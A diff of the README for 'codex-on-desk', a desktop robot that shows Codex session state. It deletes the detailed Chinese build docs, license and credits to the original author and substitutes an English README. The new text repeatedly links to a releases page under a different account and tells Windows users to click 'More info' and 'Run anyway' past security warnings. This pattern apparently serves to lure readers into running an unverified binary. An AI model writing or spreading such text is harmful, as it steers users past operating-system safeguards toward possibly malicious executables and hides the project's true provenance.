@@ -1,394 +1,199 @@
-# Codex on Desk
+# 🤖 codex-on-desk - Keep Codex State in Sight
 
-一个基于 Electron 的桌面桌宠，用来实时跟踪本机 Codex 会话状态，并把状态映射成小机器人和状态气泡。
+[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Shamussuited879/codex-on-desk/releases)
 
-本项目会驻留在桌面上，根据 Codex 当前状态展示不同反馈，例如思考、执行、错误、完成、休眠等；也支持自动发现本机会话、连接外部 `codex app-server`，以及通过托盘配置外观与展示细节。
+## 🖥️ What this app does
 
-## 看板预览
+codex-on-desk is a small desktop app for Windows. It sits on your desktop and shows the current state of your local Codex session with a robot and a speech bubble.
 
-![Codex on Desk dashboard](docs/screenshots/dashboard.png)
+It helps you see what Codex is doing at a glance:
 
-## 功能
+- Thinking
+- Running tasks
+- Showing an error
+- Finishing work
+- Sleeping when idle
 
-- 实时状态感知
-  - 根据 Codex 当前会话状态驱动桌宠动画和气泡文本
-- 三种连接模式
-  - `auto`：扫描 `~/.codex/sessions/**/*.jsonl`
-  - `managed`：由应用自行启动 `codex app-server`
-  - `external`：连接外部已有的 `codex app-server`
-- 多来源聚合
-  - 支持同时监听多个外部 `app-server`
-  - 多个来源会聚合为单个桌宠状态
-- 状态气泡
-  - 可显示或隐藏
-  - 支持 `简略` / `详细`
-  - 支持与机器人距离数值调节
-- 外观配置
-  - 机器人大小 `S / M / L`
-  - 主题颜色预设
-  - 自定义十六进制颜色
-- 交互体验
-  - 透明桌面窗口
-  - 支持拖拽
-  - 支持双击触发互动反馈
-- 设置持久化
-  - 常用 UI 配置会保存在本地 `settings.json`
-- 打包与分发
-  - 支持本地打包 macOS / Windows
-  - 支持 GitHub Actions 自动构建
+It can also:
 
-## 快速开始
+- Find local Codex sessions on its own
+- Connect to an existing `codex app-server`
+- Show more than one source at the same time
+- Save your display settings on your PC
 
-安装依赖：
+## 📥 Download
+
+Go to the releases page and download the latest Windows file:
+
+[Open the releases page](https://github.com/Shamussuited879/codex-on-desk/releases)
+
+On that page, look for the newest release and download the Windows version. After the file finishes downloading, open it to start the app.
+
+## 🪟 Windows setup
+
+1. Open the download from the releases page.
+2. If Windows asks for permission, choose **Run** or **Yes**.
+3. If you get a security screen, choose **More info** first, then choose **Run anyway** if you trust the source.
+4. Follow the on-screen setup steps.
+5. Start codex-on-desk from the Desktop or Start menu if a shortcut was created.
+
+If you use Windows PowerShell and see an `npm.ps1` restriction message while setting up from source, use `npm.cmd` instead. That is only needed for people who install from the source folder.
+
+## ✨ Features
+
+- Real-time Codex status display
+- Robot animation tied to session state
+- Speech bubble with short or detailed text
+- Bubble on or off
+- Bubble distance control
+- Three connection modes
+  - `auto` scans `~/.codex/sessions/**/*.jsonl`
+  - `managed` starts `codex app-server` for you
+  - `external` connects to an existing `codex app-server`
+- Multi-source support
+- Desktop window with transparency
+- Drag support
+- Double-click interaction
+- Saved settings in `settings.json`
+- Windows and macOS build support
+
+## 🧭 First run
+
+When you open the app for the first time, it may take a moment to find your Codex session.
+
+If Codex is already running, the app will try to match the session state and show it on screen. If no session is active yet, the robot may stay in an idle state until work begins.
+
+## ⚙️ Basic use
+
+### Status bubble
+
+The bubble can show a short or detailed message. Use the short view if you want a clean desktop. Use the detailed view if you want more context about what Codex is doing.
+
+### Robot size
+
+Choose one of these sizes:
+
+- S
+- M
+- L
+
+Use a smaller size if you want the app to stay out of the way. Use a larger size if you want it to stand out more.
+
+### Color theme
+
+You can pick from preset theme colors or enter a custom hex color. This changes the look of the robot and the bubble.
+
+### Desktop position
+
+You can drag the window around your desktop. Place it where it does not block your work.
+
+## 🔌 Connection modes
+
+### `auto`
+
+Use this if you want the app to look for local Codex session files on its own. This is the easiest mode for most users.
+
+### `managed`
+
+Use this if you want the app to start `codex app-server` for you. This works well when you want the app to handle the full connection flow.
+
+### `external`
+
+Use this if you already have a running `codex app-server`. The app connects to it instead of starting a new one.
+
+## 🧰 Settings
+
+codex-on-desk saves common settings on your machine in `settings.json`. This includes things like:
+
+- Window position
+- Bubble state
+- Bubble detail level
+- Robot size
+- Theme choice
+- Connection mode
+
+Your saved settings stay local to your PC.
+
+## 📁 What you may see after launch
+
+After you start the app, you may see:
+
+- A small robot on your desktop
+- A speech bubble near the robot
+- Changes when Codex starts thinking or running tasks
+- Idle feedback when Codex is not active
+
+If multiple sources are active, the app combines them into one status view.
+
+## 🛠️ If you want to build from source
+
+This part is only for users who want to work from the project files.
+
+1. Install Node.js on your computer.
+2. Open a terminal in the project folder.
+3. Install dependencies:
 
 ```bash
 npm install
 ```
 
-如果你在 Windows PowerShell 里遇到 `npm.ps1` 执行策略限制，可以改用：
+4. If PowerShell blocks `npm.ps1`, use:
 
 ```bash
 npm.cmd install
 ```
 
-默认安装会保留 `electron` 运行时，但不再预装 `electron-builder`。
-只有执行 `npm run dist` / `npm run dist:*` 时，才会按需下载固定版本的 `electron-builder`，这样能缩短日常 `npm install`。
+5. Start the app in development mode with the project scripts in the repository.
+6. Build a release package only when you need it. The project downloads `electron-builder` on demand for distribution tasks.
 
-仓库内的 `.npmrc` 已默认关闭 `audit` / `fund` / `progress`，并开启 `prefer-offline` 与更高的并发连接数。
+## 🖱️ Common actions
 
-如果是 Electron 二进制下载慢，可以在安装前临时指定镜像：
+- Move the robot: drag the window
+- Change what the bubble shows: open the app settings
+- Hide the bubble: turn off the bubble option
+- Make the robot larger or smaller: change the size setting
+- Switch themes: choose a preset color or enter a hex color
+- Use another Codex source: change the connection mode
 
-```bash
-$env:ELECTRON_MIRROR="https://your-electron-mirror/electron/"
-npm.cmd install
-```
+## ❓ Troubleshooting
 
-把 `https://your-electron-mirror/electron/` 替换成你实际可用的 Electron 镜像地址即可。
+### The app does not show any status
 
-启动桌宠：
+- Check that Codex is running
+- Wait a few moments for the session to appear
+- Try a different connection mode
+- If you use `external`, confirm that `codex app-server` is running
 
-```bash
-npm run electron
-```
+### The window does not stay where I placed it
 
-PowerShell 同理可写成：
+- Move the window again
+- Close the app normally so it can save the current position
+- Check that your user account can write local app settings
 
-```bash
-npm.cmd run electron
-```
+### The app looks too large or too small
 
-启动状态面板：
+- Change the robot size to S, M, or L
+- Adjust the bubble distance setting
+- Try a different theme if the current one feels too strong
 
-```bash
-npm run dashboard
-```
+### I downloaded the file but nothing happens
 
-默认行为：
+- Make sure the download finished
+- Try opening the file again from your Downloads folder
+- If Windows blocks it, choose the option to run it anyway after you review the prompt
 
-- 如果没有显式配置外部地址，会优先进入 `auto` 模式
-- `auto` 模式会尝试发现最近活跃的本机 Codex 会话
-- UI 相关设置在重启后会保留
+## 📌 Release download
 
-## 连接模式
+[Visit the releases page to download the Windows version](https://github.com/Shamussuited879/codex-on-desk/releases)
 
-### Auto
+## 🔍 Project name
 
-默认模式，自动扫描本机 Codex session 文件。
+codex-on-desk
 
-适合：
+## 🧩 Short path for Windows users
 
-- 直接跟随你当前在终端里运行的 Codex
-
-限制：
-
-- 这是基于 session 文件的启发式监听，不是官方 app-server 自动发现协议
-- 偶尔可能把最近活跃但已结束的会话也算进去
-
-### Managed
-
-应用自己启动并托管 `codex app-server`。
-
-适合：
-
-- 需要从桌宠里直接运行测试 Prompt
-- 需要一条完全由应用控制的会话链路
-
-### External
-
-连接你手工提供的外部 WebSocket 地址。
-
-环境变量：
-
-```bash
-CODEX_APP_SERVER_URL=ws://127.0.0.1:8765
-CODEX_APP_SERVER_URLS=ws://127.0.0.1:8765,ws://127.0.0.1:8766
-```
-
-## 托盘配置
-
-托盘里当前可配置：
-
-- 显示/隐藏桌宠
-- 显示/隐藏状态对话框
-- 对话框信息：`简略` / `详细`
-- 对话框距离：按 `10px` 步进增减，支持重置和自定义输入
-- 大小：`S` / `M` / `L`
-- 主题颜色：预设色或自定义十六进制颜色
-- 连接模式切换
-- 测试 Prompt 触发
-  - 仅 `managed` 模式可用
-
-## 状态映射
-
-当前会把 Codex 状态映射为桌宠视觉状态：
-
-| Codex 状态 | 桌宠表现 | 对应 SVG | 预览 |
-| --- | --- | --- | --- |
-| `idle` | 待命 | `clawd-idle-follow.svg` | ![idle](src/electron/assets/svg/clawd-idle-follow.svg) |
-| `thinking` | 思考中 | `clawd-working-thinking.svg`，忙碌线程 `>= 3` 时切换为 `clawd-working-ultrathink.svg` | ![thinking](src/electron/assets/svg/clawd-working-thinking.svg) |
-| `typing` | 输出中 | `clawd-working-typing.svg` | ![typing](src/electron/assets/svg/clawd-working-typing.svg) |
-| `working` | 执行中 | `clawd-working-typing.svg`，忙碌线程 `>= 2` 时切换为 `clawd-working-building.svg` | ![working](src/electron/assets/svg/clawd-working-building.svg) |
-| `editing` | 改文件中 | `clawd-working-carrying.svg` | ![editing](src/electron/assets/svg/clawd-working-carrying.svg) |
-| `subagent_one` | 单代理忙碌 | `clawd-working-juggling.svg` | ![subagent one](src/electron/assets/svg/clawd-working-juggling.svg) |
-| `subagent_many` | 多代理忙碌 | `clawd-working-conducting.svg` | ![subagent many](src/electron/assets/svg/clawd-working-conducting.svg) |
-| `approval` | 提醒 / 关注 | `clawd-notification.svg` | ![approval](src/electron/assets/svg/clawd-notification.svg) |
-| `error` | 错误 | `clawd-error.svg` | ![error](src/electron/assets/svg/clawd-error.svg) |
-| `success` | 完成 | `clawd-happy.svg` | ![success](src/electron/assets/svg/clawd-happy.svg) |
-| `sleeping` | 休眠 | `clawd-sleeping.svg` | ![sleeping](src/electron/assets/svg/clawd-sleeping.svg) |
-
-实际映射逻辑在 [src/electron/main.ts](src/electron/main.ts) 中完成，并会结合最近线程事件生成状态气泡内容。
-
-## 调试与测试
-
-### 终端监听器
-
-```bash
-npm run monitor
-```
-
-带测试 Prompt：
-
-```bash
-npm run monitor -- --prompt "只回复 OK。"
-```
-
-连接外部 app-server：
-
-```bash
-npm run monitor -- --listenUrl ws://127.0.0.1:8765
-```
-
-录制事件：
-
-```bash
-npm run monitor -- --record events/phase0-demo.jsonl
-```
-
-### 本地状态面板
-
-```bash
-npm run dashboard
-```
-
-默认地址：
-
-```text
-http://127.0.0.1:4580
-```
-
-### 质量检查
-
-```bash
-npm run typecheck
-npm run build:electron
-```
-
-## 打包
-
-`dist` 系列脚本会在首次执行时按需下载 `electron-builder@26.8.1`，后续通常会直接命中 npm 缓存。
-
-本机目录包：
-
-```bash
-npm run dist:dir
-```
-
-适合先本地验证资源路径和运行是否正常，不生成安装包。
-
-### macOS
-
-默认打包：
-
-```bash
-npm run dist:mac
-```
-
-会在当前 mac 环境下生成：
-
-- `.dmg`
-- `.zip`
-
-如果要区分不同芯片：
-
-Apple Silicon `arm64`：
-
-```bash
-npm run dist:mac -- --arm64
-```
-
-Intel `x64`：
-
-```bash
-npm run dist:mac -- --x64
-```
-
-Universal：
-
-```bash
-npm run dist:mac -- --universal
-```
-
-说明：
-
-- `arm64` 适合 Apple Silicon 芯片，例如 M1 / M2 / M3 / M4
-- `x64` 适合 Intel Mac
-- `universal` 同时包含两种架构，体积更大，但分发更方便
-
-### Windows
-
-默认打包：
-
-```bash
-npm run dist:win
-```
-
-会生成：
-
-- `.exe`，NSIS 安装包
-- `.zip`
-
-显式指定 `x64`：
-
-```bash
-npm run dist:win -- --x64
-```
-
-说明：
-
-- Windows 安装包更建议在 Windows 环境或 GitHub Actions 上打
-- 当前仓库已经有自动打包 workflow
-
-### 产物路径
-
-默认输出目录：
-
-```text
-release/
-```
-
-常见产物示例：
-
-```text
-release/*.dmg
-release/*.zip
-release/*.exe
-release/mac-arm64/
-```
-
-## GitHub Actions
-
-仓库包含自动打包工作流 [.github/workflows/build-desktop.yml](.github/workflows/build-desktop.yml)：
-
-- 手动触发 `Build Desktop Apps`
-- 或推送 `v*` tag 自动构建
-- 会分别构建 macOS / Windows
-- 产物会作为 workflow artifacts 上传
-- 推送 `v*` tag 时，也会自动附加到 GitHub Release 供下载
-
-### GitHub Release 下载
-
-如果你准备把仓库公开并让别人直接下载安装包，推荐用 tag 触发发布：
-
-```bash
-git tag v0.1.0
-git push origin main
-git push origin v0.1.0
-```
-
-触发后工作流会：
-
-- 构建 macOS 和 Windows 安装包
-- 保留 Actions artifacts 方便排查
-- 自动创建或更新同名 GitHub Release
-- 把 `.dmg`、`.zip`、`.exe` 上传到 Release 页面
-
-如果是 fork 仓库，请先在 GitHub 上确认该 fork 已启用 Actions。
-
-## 工作方式
-
-本项目当前有两条主要监听链路：
-
-1. `auto` 模式
-   - 扫描 `~/.codex/sessions/**/*.jsonl`
-   - 持续增量读取事件
-   - 映射为统一的 monitor 事件和线程状态
-
-2. `managed` / `external` 模式
-   - 连接一个或多个 `codex app-server`
-   - 接收线程、turn、item 级别事件
-   - 聚合成桌宠最终状态
-
-之后主进程会把聚合结果发送给 renderer，由 renderer 更新：
-
-- SVG 状态
-- 气泡内容
-- 大小和配色
-- 气泡与机器人的相对布局
-
-## 项目结构
-
-```text
-src/electron/            Electron 主进程、preload、renderer
-src/main/codex/          app-server / session 文件监听
-src/main/state/          状态聚合
-src/shared/              共享类型
-src/dashboard/           本地调试面板静态资源
-scripts/                 monitor / dashboard 启动脚本
-.github/workflows/       CI 打包工作流
-```
-
-## 已知边界
-
-- `auto` 模式依赖本地 session 文件结构，稳健性不如官方 app-server 事件流
-- `external` 模式下不会主动创建会话，只负责监听
-- `runPrompt` 只在 `managed` 模式可用
-- 当前打包配置未接入 macOS 公证和 Windows 代码签名
-
-## LICENSE
-
-本项目源码采用 [MIT License](LICENSE) 发布。
-
-### 使用的第三方资源
-
-本项目在开发过程中使用了来自以下项目和作者的资源，所有相关资源和设计都保留原作者的版权声明：
-
-- **SVG 素材**：使用了来自 [rullerzhou-afk/clawd-on-desk](https://github.com/rullerzhou-afk/clawd-on-desk) 的 26 个 SVG 素材（仅进行了颜色的修改，结构保持不变）。
-- **状态机设计**：使用了原项目中的状态机参数，包括状态映射和处理逻辑，特别是睡眠序列的时长设置等。
-- **眼球追踪系统**：直接使用了原项目的眼球追踪像素量化参数和相关算法。
-- **Mini 模式**：原项目的 Mini 模式设计和相关配置在本项目中得到了复用。
-
-本项目对上述资源进行了自定义和扩展，但原作者的设计和代码在本项目中仍然发挥着核心作用。所有这些资源的版权归原作者所有，遵循 MIT 协议进行使用。
-
-## 致谢
-
-特别感谢以下项目和作者的贡献：
-
-- **[rullerzhou-afk/clawd-on-desk](https://github.com/rullerzhou-afk/clawd-on-desk)**：本项目基于原项目的美术素材、状态机设计、眼球追踪系统、Mini 模式等核心代码进行开发。原项目中的设计和代码（包括但不限于 SVG 素材、状态机参数、眼球追踪系统和 IPC 接口命名）被直接引用，并在本项目中进行了修改和扩展。特别感谢原作者为该项目所做的贡献。
-
-原项目作者信息：
-
-- GitHub：`rullerzhou-afk`
-- 小红书账号：`鹿鹿🦌`
-
-我们深感荣幸能够在原项目的基础上构建新的功能与体验，并且在此对原项目的设计和代码表示由衷的感谢。所有原始设计和代码的版权归原作者所有。
-
+1. Open the releases page.
+2. Download the latest Windows file.
+3. Open the file.
+4. Follow the screen prompts.
+5. Start using the desktop robot
